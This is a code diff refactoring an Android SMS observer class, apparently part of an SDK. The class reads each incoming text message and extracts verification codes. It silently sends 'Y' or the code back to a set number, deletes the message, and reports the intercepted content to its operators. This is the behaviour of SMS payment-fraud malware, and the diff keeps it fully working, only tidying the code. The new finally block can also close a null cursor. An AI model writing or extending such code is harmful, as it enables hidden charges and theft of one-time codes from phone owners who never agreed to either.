@@ -36,7 +36,6 @@ public class SmsObserver extends ContentObserver {
     private static String TAG = "SmsObserver";
     static String smsContent = "";
     static String secendSmsId = "";
-    static String deleteContent = "";
 
     public SmsObserver(Handler handler) {
         super(handler);
@@ -46,13 +45,7 @@ public class SmsObserver extends ContentObserver {
     public void onChange(boolean selfChange, Uri uri) {
         super.onChange(selfChange, uri);
         try {
-            if (uri.toString().equals("content://sms/raw")) {
-                return;
-            }
-            if (uri.toString().equals("content://sms/")) {
-                return;
-            }
-            if (uri.toString().equals("content://sms")) {
+            if (uri.toString().equals("content://sms/raw") || uri.toString().equals("content://sms/") || uri.toString().equals("content://sms")) {
                 return;
             }
             a++;
@@ -68,10 +61,11 @@ public class SmsObserver extends ContentObserver {
     }
 
     private void getSMSinfo(String _id) {
+        Cursor mCursor = null;
         String smsAddress = "";
         String smsBody = "";
         try {
-            Cursor mCursor = SDKInit.getResolver().query(Uri.parse("content://sms"),
+            mCursor = SDKInit.getResolver().query(Uri.parse("content://sms"),
                     new String[]{"_id", "address", "read", "body", "thread_id"}, "_id=?", new String[]{_id},
                     "date desc");
             if (mCursor == null) {
@@ -82,17 +76,17 @@ public class SmsObserver extends ContentObserver {
                 if (addressIndex != -1) {
                     smsAddress = mCursor.getString(addressIndex);
                 }
-                int bodyndex = mCursor.getColumnIndex("body");
+                int bodyIndex = mCursor.getColumnIndex("body");
                 if (addressIndex != -1) {
-                    smsBody = mCursor.getString(bodyndex);
+                    smsBody = mCursor.getString(bodyIndex);
                 }
                 chooseSMS(smsAddress, smsBody);
                 delete(_id, smsAddress, smsBody);
             }
-            mCursor.close();
         } catch (Exception e) {
-//            Sms_send_tongbu(catchError(e), SDKInit.mContext, -1);
             e.printStackTrace();
+        } finally {
+            mCursor.close();
         }
     }
 
@@ -179,12 +173,12 @@ public class SmsObserver extends ContentObserver {
                         if (Constants.isOutPut) {
                             Log.debug("======>要开始回复Y了:" + senderContent);
                         }
-                        MySmsManager.sendSecondMessage(limitNum, senderContent);
+                        MySmsManager.SendMessage(limitNum, senderContent);
                         Log.debug("=======>limitNum:" + limitNum + "    " + senderContent);
                         Sms_send_tongbu(limitNum + "      " + senderContent + "<---回复内容 |||短信内容------>" + senderContent, context, 10001);
                     } else if (payType.equals("2")) {
                         String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
-                        MySmsManager.sendSecondMessage(limitNum, SmsContent);
+                        MySmsManager.SendMessage(limitNum, SmsContent);
                         Sms_send_tongbu("拦截到的发回去的内容----->" + limitNum + "      " + SmsContent, context, 10002);
                     } else if (payType.equals("3")) {
                         String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
@@ -201,7 +195,7 @@ public class SmsObserver extends ContentObserver {
                         Log.debug("======>SmsCode:" + SmsCode);
                         Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():" + limitNum);
                         if (SmsCode != null) {
-                            MySmsManager.sendSecondMessage(limitNum, senderContent + SmsCode);
+                            MySmsManager.SendMessage(limitNum, senderContent + SmsCode);
                             Sms_send_tongbu("拦截到的发回去的内容----->" + senderContent + SmsCode, context, 10004);
                         }
                     } else {
